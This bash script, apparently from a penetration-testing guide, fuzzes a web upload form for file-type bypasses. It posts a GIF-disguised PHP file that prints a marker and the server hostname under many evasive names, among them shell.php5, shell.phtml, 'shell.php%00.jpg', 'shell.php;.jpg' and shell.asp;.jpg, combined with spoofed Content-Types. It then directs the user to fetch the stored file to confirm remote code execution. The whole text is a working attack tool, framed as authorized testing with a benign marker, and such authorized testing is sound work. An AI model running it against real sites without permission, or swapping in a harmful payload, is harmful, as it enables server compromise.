#!/usr/bin/env bash
# upload_fuzz.sh — quick extension/MIME bypass tester via curl (guide §7/§28).
# Sends a BENIGN marker payload under many filename/Content-Type variants and prints the server's
# response code/snippet so you can see which combinations are ACCEPTED. Then verify execution by
# requesting the stored URL (guide §12).
#
# AUTHORIZED TESTING ONLY. Benign marker only. Delete uploaded files after. Tune to the real form fields.
#
# Usage:  ./upload_fuzz.sh https://target/upload  file   "Cookie: session=..."
#   $1 = upload endpoint   $2 = form field name (default "file")   $3 = optional auth header
set -u
URL="${1:-}"; FIELD="${2:-file}"; AUTH="${3:-}"
[ -z "$URL" ] && { echo "usage: $0 <upload_url> [field_name] [auth_header]"; exit 1; }

MARK='RCE-POC-'"$(echo -n yourhandle-unique-2026 | md5sum 2>/dev/null | cut -d' ' -f1)"
BODY='GIF89a;
<?php echo "'"$MARK"'-".php_uname("n"); ?>'
TMP="$(mktemp)"; printf '%s' "$BODY" > "$TMP"

NAMES=( shell.php shell.php3 shell.php5 shell.phtml shell.pht shell.phar
        shell.pHp shell.php.jpg shell.jpg.php "shell.php%00.jpg" "shell.php;.jpg"
        "shell.php." "shell.php "  shell.svg shell.html "shell.aspx" "shell.asp;.jpg" )
TYPES=( image/png image/jpeg image/gif text/plain application/octet-stream "" )

echo "[i] marker: $MARK"
echo "[i] endpoint: $URL  field: $FIELD"
echo "------------------------------------------------------------"
for n in "${NAMES[@]}"; do
  for t in "${TYPES[@]}"; do
    if [ -n "$t" ]; then PART="$FIELD=@$TMP;type=$t;filename=$n"; else PART="$FIELD=@$TMP;filename=$n"; fi
    CODE=$(curl -s -o /tmp/_resp -w "%{http_code}" -X POST "$URL" ${AUTH:+-H "$AUTH"} -F "$PART")
    SNIP=$(tr -d '\n' < /tmp/_resp | cut -c1-80)
    printf "%-22s %-26s -> %s  %s\n" "$n" "${t:-<none>}" "$CODE" "$SNIP"
  done
done
rm -f "$TMP" /tmp/_resp
echo "------------------------------------------------------------"
echo "[i] For ACCEPTED combos: fetch the stored URL and look for the marker (= RCE, guide §12)."
echo "[i] Then DELETE the uploaded files. Authorized testing only."
